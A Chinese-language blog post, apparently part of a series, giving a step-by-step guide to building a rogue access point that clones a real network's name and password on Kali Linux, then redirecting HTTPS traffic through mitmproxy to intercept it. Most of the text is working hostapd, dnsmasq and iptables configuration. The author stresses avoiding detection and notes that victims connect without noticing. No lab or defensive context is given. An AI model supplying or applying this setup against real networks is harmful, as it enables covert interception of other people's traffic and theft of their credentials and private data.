有人说你上期介绍的Cain & Abel就能干这个事啊，没错，Cain确实支持https劫持，但必须依赖arp欺骗，咱们既然已经做了假的AP将流量引过来了，为什么还要再费事做arp欺骗这种多此一举的事呢，何况做arp欺骗需要主动发出大量的arp报文，很容易被网络防护设备或终端防护软件发现。

 

然而找了很长时间，没有找到在win7下不需要做arp欺骗就能监听https的工具，于是我就转向了Linux，各种奇技淫巧满天飞，这里我把自己实践过认为最合适的方案介绍给各位。

 

既然手里有Kali Linux虚拟机，直接用就好了，把USB无线网卡插上，Kali Linux虚拟机能直接识别到，不用装任何驱动，wlan0就出来了。还记得第一篇博客中介绍的在win7中建立loopback接口并通过共享的无线连接访问外部网络吗，这里就用上了，也就是说Kali Linux的eth0连接到了loopback接口所在的桥接网络上，网关就是loopback接口，这样Kali Linux就能通过共享的无线连接访问外部网络，下一步就剩下把USB无线网卡的wlan0做成假AP了。

 

首先安装一个wifi热点软件hostapd，apt-get install hostapd，然后下载配置文件http://w1.fi/cgit/hostap/plain/hostapd/hostapd.conf，需要编辑的地方如下：

interface=wlan0

driver=nl80211

ssid=fake\_ap\_name（跟真AP的名字一样）

hw\_mode=g

channel=11

auth\_algs=1（表示需要认证）

wpa=2

wpa\_passphrase=password（跟真AP的密码一样）

wpa\_key\_mgmt=WPA-PSK

rsn\_pairwise=CCMP

把hostapd.conf放到/etc/hostapd/里，再编辑/etc/init.d/hostapd，

DAEMON\_CONF=/etc/hostapd/hostapd.conf

 

还得再安装一个dhcp服务的软件，dnsmasq，apt-get install dnsmasq，

编辑/etc/dnsmasq.conf，

interface=wlan0

dhcp-range=172.16.0.50,172.16.0.150,12h

 

顺便给wlan0配置IP地址和路由吧，

ifconfig wlan0 up

ifconfig wlan0 172.16.0.254 netmask255.255.255.0

route add -net 172.16.0.0 netmask255.255.255.0 gw 172.16.0.254

 

为了让Kali Linux有路由能力，需要编辑/etc/sysctl.conf，net.ipv4.ip\_forward=1

为了让AP网络能够顺利的访问外网，需要加一条snat规则，

iptables -t nat -A POSTROUTING -o eth0 -jMASQUERADE

 

启动hostapd和dnsmasq，service hostapd start，service dnsmasq start

 

这个时候你拿移动终端连接AP，就会接入到Kali Linux上来了，而且能正常上网，毫无察觉。

 

好了，终于到正题了，如何做https的监听？

先安装几个环境工具，apt-get install python-pyasn1 python-flask python-urwid，

接下来安装mitmproxy软件，pip install mitmproxy，如果出错，

再安装一个环境工具，apt-get install libxslt-dev，再继续pip installmitmproxy，

为了监听https流量，需要加一条dnat规则，

iptables -t nat -A PREROUTING -p tcp--destination-port 443 -j REDIRECT --to-ports 8080

最后启动mitmproxy，mitmproxy -T --host，就可以开始监听https了。
